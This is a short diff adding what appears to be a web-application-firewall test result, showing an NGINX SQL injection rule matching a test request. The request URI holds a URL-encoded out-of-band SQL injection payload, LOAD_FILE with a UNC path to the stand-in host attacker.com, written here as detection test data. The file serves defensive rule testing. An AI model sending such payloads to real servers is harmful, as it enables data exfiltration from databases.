@@ -1,0 +1,3 @@
+Expected Rule: [NGINX SQLi] Advanced SQL Injection Attempt
+Matched Rule: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_OOB_004-1772193331209-vsmfjr pattern_id=SQLI_OOB_004 uri=/?q=LOAD_FILE%28%27%5C%5Cattacker.com%5C%5Ca%27%29 client=127.0.0.1 method=GET
+Rule Match: ✅ Match
